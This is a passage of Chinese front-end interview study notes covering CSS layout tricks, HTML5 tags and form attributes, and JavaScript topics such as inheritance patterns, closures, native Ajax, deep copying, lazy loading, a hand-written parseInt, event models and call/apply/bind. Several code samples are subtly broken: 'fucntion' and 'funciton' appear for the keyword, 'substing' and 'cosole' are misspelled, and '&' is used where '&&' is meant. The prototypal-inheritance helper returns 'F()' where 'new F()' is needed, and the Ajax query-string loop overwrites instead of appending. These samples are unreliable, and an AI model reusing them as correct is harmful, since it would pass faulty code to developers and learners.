}</code></pre><p> 据说已经取消了最小字体限制，该行代码应该已经不适用</p></li><li><p>使用letter-spacing。<br> 给父级元素设置一个较大的负值，在元素上将letter-spacing归0</p><pre><code> .space {     letter-spacing: -3px; } .space a {     letter-space: 0; }</code></pre><p> 基本适用全浏览器，除Opera最小间距1px</p></li></ol><p>##13、meta viewport 移动端适配</p><pre><code>&lt;meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"&gt;</code></pre><p>##14、CSS实现宽度自适应100%，宽高16:9的比例的矩形<br>先计算高度<br><br>假设宽为100%，那么高为 h= 9/16 = 56.25%<br>设置padding-bottom实现</p><p>html</p><pre><code>&lt;body&gt;    &lt;div class="wrap"&gt;        &lt;div class="box"&gt;            &lt;p&gt;这是一个16：9的矩形&lt;/p&gt;        &lt;/div&gt;    &lt;/div&gt;&lt;/body&gt;</code></pre><p>CSS</p><pre><code>* {    margin: 0px;    padding: 0px;}.wrap {    width:50%}.box {    width: 100%;    height: 0px;    padding-bottom: 56.25%;    background: pink;    position: relative;}.box p {    width: 100%;    height: 100%;    position: absolute;}</code></pre><p>##15、画三角形<br>因为padding和margin无法设置颜色<br>所以三角形的填充颜色 利用border来进行</p><pre><code>.triangle {    width: 0;    height: 0;    border: 50px solid transparent;    border-bottom: 100px solid green;}</code></pre><p>##16、1像素边框问题<br>移动端的css里面写了1px，实际确比1px粗， iPhone的devicePixelRatio ==2 而border-width：1px是设备独立像素，所以被释放为物理像素2px，所以比较粗</p><p>###解决方法</p><ol><li>媒体查询利用设备像素比缩放，设置小数像素</li><li>border-image方案</li><li>background-image渐变实现</li><li>box-shadow方案</li><li>transform: scale(0.5)</li></ol><p>#html<br>##1、语义化<br>HTML的语义化有助于SEO，爬虫抓取更多有效信息，在没有CSS的情况下也能结构分明，方遍开发维护</p><p>##2、新标签新特性</p><ul><li>增加的标签</li></ul><table><thead><tr><th align="center">标签</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">header</td><td align="center">定义文档头部</td></tr><tr><td align="center">footer</td><td align="center">定义文档尾部</td></tr><tr><td align="center">nav</td><td align="center">定义文档导航</td></tr><tr><td align="center">section</td><td align="center">定义区块</td></tr><tr><td align="center">article</td><td align="center">定义页面独立的内容区域</td></tr><tr><td align="center">aside</td><td align="center">定义边栏</td></tr><tr><td align="center">details</td><td align="center">定义文档描述细节</td></tr><tr><td align="center">summary</td><td align="center">标签包含details元素标题</td></tr><tr><td align="center">dialog</td><td align="center">定义对话框，比如提示框</td></tr><tr><td align="center">canvas</td><td align="center">用于绘画的标签</td></tr><tr><td align="center">audio</td><td align="center">音频播放</td></tr><tr><td align="center">video</td><td align="center">视频播放</td></tr></tbody></table><ul><li>增强型表单type</li></ul><table><thead><tr><th align="center">输入类型</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">color</td><td align="center">选取颜色</td></tr><tr><td align="center">date</td><td align="center">从一个日期选择器选取一个日期</td></tr><tr><td align="center">datetime</td><td align="center">选择一个日期（UTC时间）</td></tr><tr><td align="center">datetime-local</td><td align="center">选择一个日期和时间（无时区）</td></tr><tr><td align="center">email</td><td align="center">包含一个邮件地址输入域</td></tr><tr><td align="center">month</td><td align="center">选择一个月份</td></tr><tr><td align="center">number</td><td align="center">数值的输入域</td></tr><tr><td align="center">range</td><td align="center">一定范围内的数字值输入域</td></tr><tr><td align="center">search</td><td align="center">用于搜索域</td></tr><tr><td align="center">tel</td><td align="center">定义输入电话字段</td></tr><tr><td align="center">time</td><td align="center">选择一个时间</td></tr><tr><td align="center">url</td><td align="center">URL地址的输入域</td></tr><tr><td align="center">week</td><td align="center">选择周和年</td></tr></tbody></table><ul><li>新增表单属性 </li></ul><table><thead><tr><th align="center">属性</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">placeholder</td><td align="center">输入框提示灰色字</td></tr><tr><td align="center">required</td><td align="center">boolean属性，要求输入域不为空</td></tr><tr><td align="center">pattern</td><td align="center">描述了一个正则用于验证input值</td></tr><tr><td align="center">min和max属性</td><td align="center">设置了元素的最小值最大值</td></tr><tr><td align="center">step</td><td align="center">为输入域规定合法数字间隔</td></tr><tr><td align="center">height和width</td><td align="center">用于image类型input图像高度宽度</td></tr><tr><td align="center">autofocus</td><td align="center">boolean属性，页面加载自动获得焦点</td></tr><tr><td align="center">multiple</td><td align="center">boolean属性，规定input元素可选择多个值</td></tr></tbody></table><p>##3、input和textarea的区别<br>###input标签</p><ol><li>需要指定type属性，如text，password</li><li>通过size属性指定显示字符长度</li><li>value属性指定初始值</li><li>Maxlength属性指定文本框可以输入的最长长度</li><li>焦点垂直居中文本框中，单行</li></ol><p>###textarea标签</p><ol><li>需要来封闭</li><li>内容写在标签中</li><li>使用row，col指定textarea大小</li><li>焦点在左上角，多行</li></ol><p>##4、用一个div模拟textarea的实现</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;模拟textarea&lt;/title&gt;    &lt;style&gt;        #textarea {            width: 300px;            min-height: 120px;            max-height: 300px;            border: 1px solid #333;            overflow-y: auto        }    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;div id="textarea" contenteditable="true"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>##5、移动设备忽略将页面中的数字识别为电话号码的方法</p><pre><code>&lt;meta name = "format-detection" content = "telephone=no"&gt;</code></pre><p>#JS<br>##1、原型/原型链/构造函数/实例/继承<br>###1. <strong>proto</strong>(原型)<br>每个对象又有<strong>proto</strong>属性，指向创建他的构造函数的原型对象（实例指向原型对象的指针）<br>###2.prototype原型对象<br>每个函数都有一个prototype属性，是指向一个对象的引用，这个对象成为原型对象，原型对象包含函数实例共享的方法和属性，也就是说将函数用作new时，新创建的对象会从原型上继承属性和方法<br>###3.原型链</p><p>原型可以通过<strong>proto</strong>访问到原型的原型，比如构造函数Person继承前者的有一个构造函数People,然后new People得到实例p<br><img src="https://ask.qcloudimg.com/http-save/yehe-1500612/fib8zehnvz.png?imageView2/2/w/1620" alt="image"><br><img src="https://upload-images.jianshu.io/upload_images/5899414-6eb98d0ab171275d.png" alt="image"><br>###4.构造函数Constructor 实例、<br>new运算符创建的函数，其实就是构造函数，构造函数创建出的对象，就是实例<br>###5.继承<br>子类可以使用父类的所有功能，并且对这些功能进行扩展。继承的过程，就是从一般到特殊的过程</p><p>##2、有几种方式可以实现继承<br>###6种方式实现继承</p><p>想要继承，必须有一个父类</p><pre><code>function Person(name){    this.name=name    this.sum = function(){        alert(this.name)    }}Person.prototype.age = 10;</code></pre><ol><li>原型链继承</li></ol><pre><code>function Per(){    this.name = "ker"}Per.prototype = new Person();//原型链继承var per1 = new Per();console.log(per1.age)//10// instanceof 判断元素是否早另一个元素的原型链上// per1 继承了Person的属性，返回trueconsole.log(per1 instanceof Person)</code></pre><p>重点：需要让新实例的原型，被父类的实例赋值<br>优点：实例可继承的属性有: 实例的构造函数的属性，父类构造函数属性，父类原型的属性<br>缺点：1. 新实例无法向父类构造函数传参<br>     2. 继承单一<br>     3. 所有新实例都会共享父类实例属性，原型上的属性是共享的，一个实例修改了原型属性，所有实例的原型属性也会被修改</p><ol start="2"><li>构造函数继承</li></ol><pre><code>function Con(){    Person.call(this,"jer")//重点    this.age = 12;}var con1 = new Con();console.log(con1.name);//"jer"console.log(con1.age);//12console.log(con1 instanceof Person)//false</code></pre><p>重点：用call()和apply()将父类构造函数引入子类函数<br>优点: 1. 只继承了父类构造函数的属性，没有继承父类原型属性<br>      2. 解决了原型链继承缺点123<br>      3. 可以继承多个构造函数属性（call多个）<br>      4. 在子实例中可以向父实例传参<br>缺点: 1. 只能继承附列构造函数属性<br>      2. 无法实现构造函数的复用（每次用每次都要重新调用）<br>      3. 每个新实例都有父类构造函数的副本，臃肿</p><ol start="3"><li>组合继承（组合原型链继承和构造函数继承）（常用）</li></ol><pre><code>function SubType(name){    Person.call(this,name)//借用构造函数继承}SubType.prototype = new Person()//原型链继承var sub = new SubType("gar")console.log(sub.name)//“gar”继承了构造函数属性console.log(sub.age);//10 继承了父类原型的属性</code></pre><p>重点: 结合了两种模式的有点，传参和复用<br>优点: 1. 可以继承父类原型上的属性，可以传参，可以复用<br>      2. 每个新实例引入的构造函数是私有的<br>缺点: 调用两次父类的构造函数，子类的构造函数会代替原型上那个父类构造函数</p><ol start="4"><li>原型式继承</li></ol><pre><code>// 先封装一个函数容器，用来输出对象和承载继承的原型function content(obj){    function F(){}    F.prototype = obj;//继承了传入的参数    return F(); //返回函数对象}var sup = new Person();// 拿到父类实例var sup1 = content(sup);console.log(sup1.age);// 10 继承了父类函数的属性</code></pre><p>重点: 用函数包裹对象，然后返回函数的调用，这个函数就变成了可以随意添加属性的实例或对象，object.create()就是这个原理<br>特点: 类似于复制一个对象，用函数来包装<br>缺点: 1. 所有实例都会继承原型上属性<br>      2. 无法实现复用，新实例属性都是后面添加的</p><ol start="5"><li>寄生式继承</li></ol><pre><code>function content(obj){    function F(){}    F.prototype = obj    return new F();}var sup = new Person();function subobject(obj){    var sub = content(obj)    sub.name = "gar"    return sub;}var sup2 = subobject(sup)console.log(typeof subobject)//functionconsole.log(typeof sup2)//objectconsole.log(sup2.name)//"gar" 返回了个sub对象，继承了sub的属性</code></pre><p>重点：就是给原型式继承外面套了壳子<br>特点: 没有创建自定义类型，因为只是套了壳子返回对象，这个函数也就成为了新对象<br>缺点：没用到原型，无法复用<br>6. 寄生组合式继承（常用）</p><p>##3、用原型实现继承有什么缺点，怎么解决<br>缺点 </p><ol><li><p>重写子类的原型 等于 父类的一个实例，（父类的实例属相变成子类的原型属性）如果父类包含引用类型的属性，那么子类所有实例都会共享该属性</p></li><li><p>在创建子类实例时，不能向父类的构造函数传递参数</p></li></ol><p>解决办法：组合继承解决原型链继承的引用类型原型属性被实例共享问题<br>##4、arguments<br>它是js的一个内置对象，常被忽略，js不像JAVA是显示传递参数，js传的是形参，可以传也可以不传，若方法里面没有写参数，却传入了参数，可用arguments拿到参数<br>每一个函数都有一个arguments对象，他包括了函数所要调的参数，通常我们把它当作数组使用，用它的length得到参数数量，但它是类数组对象，无法使用push<br>##5、数据类型判断</p><ol><li>typeof</li></ol><pre><code>typeof '';//string 有效typeof 1; // number 有效typeof Symbol();//symbol 有效typeof true; // booleantypeof undefined; //undefined 有效typeof null; // object 无效typeof []; // object 无效typeof new Function(); // functionyoux typeof new Date(); // object 无效typeof new RegExp; //object 无效</code></pre><ol start="2"><li><p>instanceof<br>用于判断A是否是B的实例，表达式为 A instanceof B</p></li><li><p>constructor</p></li></ol><pre><code>console.log('数据类型判断' - constructor);console.log(arr.constructor === Array);//trueconsole.log(date.constructor === Date); // trueconsole.log(fn.constructor === Function); // true</code></pre><ol start="4"><li>toString</li></ol><pre><code>Object.prototype.toString.call('');//[object String]Object.prototype.toString.call(1); //[object Nmuber]Object.prototype.toString.call(document)//[object HTMLDocument]Object.prototype.toString.call(window)//[object global]</code></pre><p>##6、作用域链、闭包、作用域</p><p>###作用域<br>js的作用域是靠函数形成的，函数外不可访问函数内的变量，作用域就是变量和函数的可访问的范围。</p><p>###作用域链<br>当代码在一个环境中执行时，会创建变量对象的一个作用域链(scope chain)来保证对执行环境有权访问的变量和函数的有序访问</p><p>###闭包<br>能够访问另一个函数作用域中变量的函数</p><pre><code>function outer() {    var a = '变量1'    var inner = function () {        console.info(a)    }    return inner //inner就是一个闭包函数，因为他可以访问outer函数的作用域}</code></pre><p>闭包的问题</p><ol><li>引用的变量可能发生变化</li><li>this指向</li><li>内存泄漏</li></ol><p>闭包的作用</p><ol><li>解决递归调用</li><li>模仿块级作用域</li></ol><p>##7、Ajax的原生写法</p><pre><code>function ajax(opts){    var xhr = new XMLHttpRequest();//创建ajax对象    xhr.onreadystatechange = fucntion(){        if(xhr.readyState ===4 &amp; xhr.status===200){            opts.success(JSON.parse(xhr.responseText))        }else if(xhr.readyState === 4 &amp; xhr.status !== 200){            opts.error();        }    }    var urlStr = ''    for (var key in opts.data){        urlStr = key + '=' + opts.data[key] + '&amp;';    }    urlStr = urlStr.substing(0, urlStr.length-1);    if(opts.type.toLowerCase() === 'get'){        xhr.open(opts.type, opts.url + '?' + urlStr, true)        xhr.send()    }    if(opts.type.toLowerCase() === 'post'){        xhr.open('post', opts.url, true);        xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");        xhr.send(urlStr);    }};btn.addEventListener('click', function(){    ajax({        url: 'list.json',        type: 'post',        success: fucntion(data){            console.log(data.list)        },        error: function(){            console.log('发生了错误...')        }    })})</code></pre><p>##8、对象深拷贝、浅拷贝<br>对象是引用类型，所以直接赋值修改赋值后的数值，原对象会改变</p><pre><code>var boy = {    age: 18}var girl = boy;console.log(boy === girl) //truegirl.age = 20console.log(boy.age);//20</code></pre><p>###浅拷贝</p><pre><code>var boy = {    age: 18,    address: {        home: '天堂'    }}var girl = Object.assign({},boy);console.log(boy === girl) //falsegirl.age = 20;console.log(boy.age);//18girl.address.home = '上海'console.log(boy.address.home);//上海</code></pre><p>因为Object.assign（）只是浅拷贝girl.address是对栈对象的引用，因此内层对象的修改会影响原始对象。</p><p>###深拷贝</p><ol><li>JSON.parse()和JSON.stringify()深拷贝(仅适用纯JSON对象)</li></ol><pre><code>function deepClone(obj) {    return JSON.parse(JSON.stringify(obj));}</code></pre><ol start="2"><li>对象遍历</li></ol><pre><code>//包含其他负责的内容 date对象 null undefinedvar obj1={    name:"张三",    age:20,    height:[12,26,46],    address:{        home:'北京'    },    birthday:new Date(),    father:null,    mother:undefined,    school:[            {                middleschool:'北大附中',            },            {                university:'清华大学',            }        ]    }    function clone(obj) {         if(obj === null) return null         if(typeof obj !== 'object') return obj;        if(obj.constructor === Date) return new Date(obj);         if(obj.constructor === RegExp) return new RegExp(obj);        var newObj = new obj.constructor ();  //保持继承链        for (var key in obj) {         if (obj.hasOwnProperty(key)) {   //不遍历其原型链上的属性              var val = obj[key];              newObj[key] = typeof val === 'object' ? arguments.callee(val) : val; // 使用arguments.callee解除与函数名的耦合          }            }              return newObj;      };         console.log(obj1);    console.log(clone(obj1));</code></pre><ol><li><p>用 new obj.constructor ()构造函数新建一个空的对象，可以保持原形链的继承；</p></li><li><p>用obj.hasOwnProperty(key)来判断属性是否来自原型链上，因为for..in..也会遍历其原型链上的可枚举属性。</p></li><li><p>函数用到递归算法，在函数有名字，而且名字以后也不会变的情况下，这样定义没有问题。但问题是这个函数的执行与函数名 factorial 紧紧耦合在了一起。为了消除这种紧密耦合的现象，需要使用 arguments.callee。</p></li></ol><p>##9、图片懒加载、预加载<br>###图片预加载</p><p>即提前加载图片，可保证图片快速、无缝地发布，用户需要查看时可直接从本地缓存中渲染，适用于图片占据很大比例的网站。</p><ol><li>js new image对象 设置src加载</li></ol><pre><code>function preloader(){    if (document.images) {        var img1 = new Image()        var img2 = new Image()        var img3 = new Image()        img1.src = "";        img2.src = "";        img3.src = "";    }}function addLoadEvent(func) {    var oldonload = window.onload;    if (typeof window.onload != 'fucntion') {        window.onload = func;    }else {        window.onload = function (){            if (oldonload) {                oldonload();            }            func();        }    }}addLoadEvent(preloader);div.appendChild(img1)//插入到DOM</code></pre><ol start="2"><li>Ajax预加载， new Image()对象设置src</li></ol><pre><code>window.onload = function() {    setTimeout(function() {        var xhr = new XMLHttpRequest();        xhr.open('GET',url);        xhr.send();        xhr = new XMLHttpRequest();        xhr.open('GET', url)        xhr.send()        // preload image        new Image().src = '';    }, 1000);}</code></pre><p>###懒加载</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;    &lt;meta charset="UTF-8"&gt;    &lt;title&gt;Lazyload 2&lt;/title&gt;    &lt;style&gt;    img {        display: block;        margin-bottom: 50px;        height: 200px;    }    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;img src="images/loading.gif" data-src="images/1.png"&gt;    &lt;img src="images/loading.gif" data-src="images/2.png"&gt;    &lt;img src="images/loading.gif" data-src="images/3.png"&gt;    &lt;img src="images/loading.gif" data-src="images/4.png"&gt;    &lt;img src="images/loading.gif" data-src="images/5.png"&gt;    &lt;img src="images/loading.gif" data-src="images/6.png"&gt;    &lt;img src="images/loading.gif" data-src="images/7.png"&gt;    &lt;img src="images/loading.gif" data-src="images/8.png"&gt;    &lt;img src="images/loading.gif" data-src="images/9.png"&gt;    &lt;img src="images/loading.gif" data-src="images/10.png"&gt;    &lt;img src="images/loading.gif" data-src="images/11.png"&gt;    &lt;img src="images/loading.gif" data-src="images/12.png"&gt;    &lt;script&gt;    function throttle(fn, delay, atleast) {//函数绑定在 scroll 事件上，当页面滚动时，避免函数被高频触发，        var timeout = null,//进行去抖处理        startTime = new Date();        return function() {        var curTime = new Date();        clearTimeout(timeout);        if(curTime - startTime &gt;= atleast) {            fn();            startTime = curTime;        }else {            timeout = setTimeout(fn, delay);        }        }    }    function lazyload() {        var images = document.getElementsByTagName('img');        var len    = images.length;        var n      = 0;      //存储图片加载到的位置，避免每次都从第一张图片开始遍历                return function() {        var seeHeight = document.documentElement.clientHeight;        var scrollTop = document.documentElement.scrollTop || document.body.scrollTop;        for(var i = n; i &lt; len; i++) {            if(images[i].offsetTop &lt; seeHeight + scrollTop) {                if(images[i].getAttribute('src') === 'images/loading.gif') {                 images[i].src = images[i].getAttribute('data-src');                }            n = n + 1;             }        }        }    }    var loadImages = lazyload();    loadImages();          //初始化首页的页面图片    window.addEventListener('scroll', throttle(loadImages, 500, 1000), false);　　//函数节流（throttle）与函数去抖（debounce）处理,//500ms 的延迟，和 1000ms 的间隔，当超过 1000ms 未触发该函数，则立即执行该函数，不然则延迟 500ms 执行该函数    &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>##10、实现页面加载进度条</p><p>##11、this关键字</p><p>##12、函数式编程</p><p>##13、手动实现parseInt</p><pre><code>function _parseInt (string, radix) {    if (typeof string !== "string" &amp;&amp; typeof string !== "number") return NaN;    if (radix &amp;&amp; (typeof radix !== "number" || /^[1-9]\d*\.\d*|0\.\d*[1-9]\d*$/.test(radix) || radix &gt; 36 || radix &lt; 2)) return NaN;    string = String(string)    var rexp = (radix == 10) ? /(-?)([0]?)([0-9]+)/ : /(-?)([0]?[Xx]?)([0-9a-fA-F]+)/,        a = string.match(rexp),        sign = a[1],        rawRadix = a[2],        rawNum = a[3],        result = 0,        strArr = rawNum.split(''),        len = strArr.length,        numArr = [];    if (a &amp;&amp; !radix) {        if ( rawRadix.toUpperCase() === "0X") {            radix = 16;        } else if (rawRadix === "0") {            radix = 8;        } else {            radix = 10;        }    }    for (var i = 0; i &lt; len; i++){        var num;        var charCode = strArr[i].toUpperCase().charCodeAt(0);        if(radix &lt;=36 &amp;&amp; radix &gt;= 11) {            if (charCode &gt;= 65 &amp;&amp; charCode &lt;= 90) {                num = charCode - 55;            } else {                num = charCode - 48;            }        }  else {            num = charCode - 48;        }        if (num &lt; radix) {            numArr.push(num);        } else {            return NaN        };    }    if(numArr.length &gt; 0) {      numArr.forEach(function(item, j){          result += item * Math.pow(radix, numArr.length-j-1);      })    }    if(sign === "-"){      result = -result;    }    return result}// 以下例子均返回15:console.log(_parseInt("F", 16));console.log(_parseInt("17", 8));console.log(_parseInt("15", 10));console.log(_parseInt(15.99, 10));console.log(_parseInt("FXX123", 16));console.log(_parseInt("1111", 2));console.log(_parseInt("15*3", 10));console.log(_parseInt("12", 13));// 以下例子均返回 NaN:console.log(_parseInt("Hello", 8)); // Not a number at allconsole.log(_parseInt("546", 2));   // Digits are not valid for binary representations// 以下例子均返回 -15：console.log(_parseInt("-F", 16));console.log(_parseInt("-0F", 16));console.log(_parseInt("-0XF", 16));console.log(_parseInt(-15.1, 10));console.log(_parseInt(" -17", 8));console.log(_parseInt(" -15", 10));console.log(_parseInt("-1111", 2));console.log(_parseInt("-15e1", 10));console.log(_parseInt("-12", 13));// 下例中也全部返回 17，因为输入的 string 参数以 "0x" 开头时作为十六进制数字解释，而第二个参数假如经过 Number 函数转换后为 0 或 NaN，则将会忽略。console.log(_parseInt("0x11", 16));console.log(_parseInt("0x11", 0));console.log(_parseInt("0x11"));// 下面的例子返回 224console.log(_parseInt("0e0",16));</code></pre><p>##14、为什么会有同源策略</p><ul><li>协议、域名、端口号一致，表示同源</li><li>不能通过ajax请求不同源的数据，不能通过脚本操作不同域下的DOM</li><li>设置同源限制主要是为了安全，如果没有同源限制存在浏览器中的cookie等其他数据可以任意读取，不同域下DOM任意操作，ajax任意请求的话如果浏览了恶意网站那么就会泄漏这些隐私数据</li></ul><p>##15、怎么判断两个对象是否相等</p><pre><code>// 传入两个对象function isObjectValueEqual(a, b) {    // Object.getOwnPropertyNames()    var aProps = Object.getOwnPropertyNames(a);    var bProps = Object.getOwnPropertyNames(b);    if (aProps.length != bProps.length) {        return false;    }    for (var i = 0; i &lt; aProps.length; i++) {        var propName = aProps[i];        if (a[propName] !== b[propName]) {            return false;        }    }    return true;}</code></pre><p>##16、事件模型</p><p>###事件与事件流</p><p>事件是浏览器与文档交互的瞬间，比如点击按钮，填写表格等操作，它是Javascript与HTML之间沟通的桥梁，DOM是树状结构，如果同时给父节点绑定时间，触发子节点时，两个事件发生的顺序就牵涉到事件流的内容，它描述的是页面接受事件的顺序，事件流描述的是从页面接受事件的顺序，但是IE的事件流食冒泡流，而Netspace Communicator的事件流是捕获流</p><ul><li>IE的事件流叫做事件冒泡。即事件开始由最具体的元素接收，然后逐级向上传播到不具体的节点。事件捕获则相反，是不太具体的节点硬更早接收事件，具体的节点应该最后接收事件。</li></ul><ol><li>DOM0级事件模型</li></ol><p>是早期的事件模型，又称为原始事件模型，在该模型中，事件不会传播，即没有事件流的概念。事件绑定监听函数较为简单，要使用js指定事件处理程序，首先取得一个要操作的对象的引用。<br>每个元素都有自己的事件处理属性，通常全部小写，例如onclick，设置为函数即可指定事件处理程序：</p><pre><code>btn = document.getElementById("myBtn" = "Clicked!")// HTML事件处理程序&lt;form method = "post"&gt;    &lt;input type="text" name="username" value=""&gt;    &lt;input type="button" value="Username" onclick="alert(username.value)"&gt;&lt;/form&gt;</code></pre><ol start="2"><li>DOM2级事件模型</li></ol><p>在该模型中，分为三个过程：事件捕获，处于目标阶段，事件冒泡阶段</p><ul><li>事件捕获阶段。事件从document一直向下传播到目标元素，依次检查经过的节点是否绑定了时间监听函数，如果有则执行</li><li>事件处理阶段。事件达到目标元素，触发目标元素的监听函数</li><li>事件冒泡阶段。事件从目标元素冒泡到document，一次检查经过节点是否绑定了事件监听函数，如果有则执行，定义了两个方法addEventListener()和removeEventListener()。所有DOM节点都包含这两个方法，并且有三个参数，要处理的事件名、作为事件处理程序的函数和一个布尔值。要在click事件添加事件处理程序，可以用： </li></ul><pre><code>var btn = document.getElementById("myBtn");btn.addEventListener("click",function(){    alert(this.id);}, false);btn.addEventListener("click",function(){    alert("Hello kid")},false)</code></pre><p>执行顺序为”myBtn”,”Hello kid”。IE中执行顺序相反</p><p>移除事件监听方式如下</p><pre><code>btn.removeEventListener("click")</code></pre><ol start="3"><li>IE中的事件模型</li></ol><pre><code>var btn = document.getElementById("myBtn");var handler = function() {    alert(this.id);};btn.attachEvent("onclick", handler);//添加事件处理程序btn.detachEvent("onclick", handler);//删除事件处理程序</code></pre><p>###事件委托、代理<br>利用事件冒泡的原理，把目标事件委托给父元素</p><p>优点: </p><ol><li>管理函数变少了，不需要为每个元素都添加监听函数，对于同一个父节点下面类似的子元素，可以通过委托给父元素的监听函数来处理</li><li>可以方便地动态添加和修改元素，不需要因为元素的改动而修改事件绑定。（比如后来添加子元素依然拥有事件）</li><li>JavaScript和DOM节点之间的关联变少了，这样也就减少了因循环引用而带来的内存泄漏发生的概率。</li></ol><p>###应用场景</p><p>很多商品放在一个ul下面的li标签里面，点击添加或删除商品，就可以绑定商品的父元素ul标签，通过事件代理去找到要点击的商品，完成添加删除事件</p><p>###如何让事件先冒泡后捕获</p><p>##17、window的onload事件和domcontentloaded</p><ol><li>当onload触发时，页面上所有的DOM，CSS，script，图片，flash等全部加载完成了</li><li>DOMContentLoaded事件触发时，仅仅DOM加载完成，其余均未完成</li></ol><p>##18、for…in迭代和for…of有什么区别</p><p>###for in</p><pre><code>// for in 应用于数组Array.prototype.sayHello = function(){    console.log("Hello")}Array.prototype.str = "world";var myArray = [1,2,10,30,100];myArray.name = "数组"for(let index in myArray) {    console.log(index);}// 结果: "0" "1" "2" "3" "4" "name" "sayHello" "str"</code></pre><pre><code>// for in 应用于对象中Object.prototype.sayHello = function(){    console.log('Hello');}Object.prototype.str = "World";var myObject = {name: 'hanlei', age:100};for(let index in myObject){    console.log(index);}// 输出结果："name" "age" "sayHello" "str"// 首先输出的是对象的属性名，再是对象原型的属性和方法//如果不想让其输出原型中的属性和方法，可以使用hasOwnProperty方法进行过滤for (let index in myObject){    if(myObject.hasOwnProperty(index)){        console.log(index)    }}// 输出结果为: "name" "age"// 也可以通过Object.keys()方法获取所有的自身可枚举属性组成的数组Object.keys(myObject)</code></pre><p>经观察，for in应用于数组返回是数组下标和属性和原型上的方法和属性，而对象中返回的是对象的属性名和原型中的方法和属性<br>for in遍历数组时，会存在几个问题</p><ol><li>index索引为字符串，不能进行运算</li><li>遍历顺序有可能不是按照数组内部顺序</li><li>for in会遍历所有可枚举属性，包括原型</li></ol><p>###for of</p><pre><code>Object.prototype.sayHello = function(){    console.log('Hello');}var myObject =  {    name: 'hanlei',    age: 100}for(let key of myObject){    console.log(key)}// 结果：TypeErrorArray.prototype.sayHello = function(){    console.log('hello');}var myArray = [1,2 ,1231,1,56877]for (let key of myArray) {    console.log(key);}</code></pre><p>for of遍历的是数组的元素值</p><p>总结: </p><ol><li>遍历对象用for in，遍历数组使用for of</li><li>for in循环出的是key，for of循环出的是value</li><li>注意 for of是ES6新特性，为了修复ES5for in的不足</li><li>for of 不能遍历普通对象，需要通过Object。keys()搭配使用</li></ol><p>##19、函数柯里化</p><p>柯里化(currying),是把接受多个参数的函数变换成接受一个单一参数的函数，并返回接受剩下参数且返回结果的新函数的技术。<br>即只传给函数一部分参数调用它，让它返回一个函数，去处理剩下的参数</p><pre><code>function add(x, y, z) {    return x + y + z;}console.log(add(1, 2, 3))//6var add = function(x) {    return function(y) {        return funciton (z) {            return x + y + z;        }    }}var addOne = add(1);var addOneAndTwo = addOne(2);var addOnetoThree = addOneAndTwo(3);console.log(addOnetoThree)</code></pre><p>通过闭包记住第一个参数以此类推，可以用ES6的箭头函数写成这样：</p><pre><code>const add = x =&gt; y =&gt; z =&gt; x + y + z</code></pre><p>##20、call apply区别，原生实现bind</p><p>bind,apply,bind方法，其实是函数的另外一种调用方法，功能上等同于<code>fn</code>,只是调用者由bind，apply，call来决定，也就是<code>bind,apply,call</code>指定函数执行上下文</p><p>声明一个函数后，基本调用方式为：</p><pre><code>// 方法定义var obj = {    todo: function(){        console.log("rushB");    }}// 调用obj.todo();// "rushB"</code></pre><pre><code>// 函数声明function todo() {    cosole.log("rushA");}// 调用todo();</code></pre><pre><code>// 函数表达式var todo = function() {    console.log("rush不动了")}// 调用方法todo()</code></pre><p>接下里用<code>bind,apply,call</code>对上面进行改写</p><pre><code>var obj = {    todo: function() {        console.log("rushA");    }}// 调用方式obj.todo.apply();obj.todo.call();obj.todo.bind()();// 函数声明function todo() {    console.log("rushB");}// 调用方式var todo = function() {    console.log("rush不动了")}// 函数表达式todo.apply();todo.call();todo.bind()();</code></pre><p>可以传参数，第一个参数就是受益者，this的指向对象，第二个参数是arguments</p><pre><code>fn.apply(otherObj);fn.call(otherObj);fn.bind(otherObj)()</code></pre><p>需要调用this才生效</p><pre><code>var csgo = "rushAB";var obj = {    csgo: "rushA",    fn: function(){        console.log(this.csgo)    }}obj.fn()//this指向window，获得想要的window上的属性obj.fn.apply(window)obj.fn.call(window)obj.fn.bind(window)()如果将this换成objvar obj = {    csgo: "rushA",    fn: function(){        console.log(obj.csgo)    }}obj.fn()//this指向window，没有获得window上的属性obj.fn.apply(window)obj.fn.call(window)obj.fn.bind(window)()</code></pre><p>三个方法允许我们明确指定方法中的this指向</p><p>###bind,aplly,call的区别</p><ul><li><p>apply 和 call 的用法几乎相同, 唯一的差别在于当函数需要传递多个变量时, apply 可以接受一个数组作为参数输入, call 则是接受一系列的单独变量。</p></li><li><p>在上面的代码片段中，我们可以看出bind使用方法和apply， call 不一样，多了一个执行()。那是因为bind在函数调用后，实际上会返回一个新函数。</p></li><li><p>bind,aplly,call中只有apply接收一个数组，可以通过apply和array两个单词尾部都是y记忆。bind,call则都是接收一系列单独变量。</p></li></ul><p>####注意</p><p>Array.prototype.slice.apply.(obj)，可以让一个类数组对象使用数组的方法，类数组主要是指通过DOM 操作获取的DomList 和arguments，都是具有length属性的对象。</p><p>Object.prototype.toString.call(obj).slice(8, -1) 方法获取对象属性，比typeof()更可信。<br>在 ES6 的箭头函数下, call 和 apply 的失效<br>不可以当作构造函数, 也就是说不可以使用 new 命令, 否则会抛出一个错误</p><p>###call，apply，bind 三者用法和区别：角度可为参数、绑定规则（显示绑定和强绑定），运行效率、运行情况。<br>##21、async/await<br>##22、立即执行函数和使用场景<br>##23、设计模式(要求说出如何实现,应用,优缺点)/单例模式实现<br>##24、iframe的缺点有哪些<br>##25、数组问题</p><ul><li>数组去重</li></ul><ol><li>遍历数组法</li></ol><p>实现思路：新建一个数组，遍历去要重的数组，当值不在新数组的时候（indexOf为-1）就加入该新数组中</p><pre><code>var arr=[2,8,5,0,5,2,6,7,2];function unique1(arr){  var hash=[];  for (var i = 0; i &lt; arr.length; i++) {     if(hash.indexOf(arr[i])==-1){      hash.push(arr[i]);     }  }  return hash;}</code></pre><ol start="2"><li>数组下标判断法</li></ol><p>实现思路：如果当前数组的第 i 